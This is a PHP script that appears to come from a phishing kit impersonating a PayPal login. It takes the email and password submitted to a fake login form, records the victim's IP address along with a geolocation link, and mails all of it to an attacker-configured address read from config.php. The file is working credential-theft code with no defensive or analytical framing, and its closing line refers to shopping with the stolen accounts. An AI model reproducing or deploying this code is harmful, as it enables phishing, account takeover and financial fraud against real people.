<?php
  $email = $_POST['login_email'];
  $password = $_POST['login_password'];
  $ip_addresse = getenv('HTTP_CLIENT_IP')?:
  getenv('HTTP_X_FORWARDED_FOR')?:
  getenv('HTTP_X_FORWARDED')?:
  getenv('HTTP_FORWARDED_FOR')?:
  getenv('HTTP_FORWARDED')?:
  getenv('REMOTE_ADDR');
  $subject = "PPL LOGIN  - FROM ". $ip_addresse ."  -";
  $headers = "From: NARISSI \r\n";
  $headers .= "Reply-To: no-reply \r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
  $msg = "<div style='text-align: center; width: 400px'>";
  $msg .= "----------------------   Login   ------------------------- <br><br>";
  $msg .= "<b> Email : </b> <span style='color: #3498DB;'>$email</span> <br><br>";
  $msg .= "<b> Password : </b> <span style='color: #3498DB;'>$password</span> <br><br>";
  $msg .= "<b> Ip Address : </b> <span style='color: #FC575E;'>$ip_addresse</span> <br><br>";
  $msg .= "<a href='https://geoiptool.com/fr/?ip=$ip_addresse' target='_blank'>https://geoiptool.com/fr/?ip=$ip_addresse</a><br><br>";
  $msg .= "------------------- Good Luck & Happy Shop <3  ------------------------- <br><br>";
  $msg .= "</div>";
  include '../../config.php';
  $to = $result_to;
  mail($to, $subject, $msg, $headers);
?>
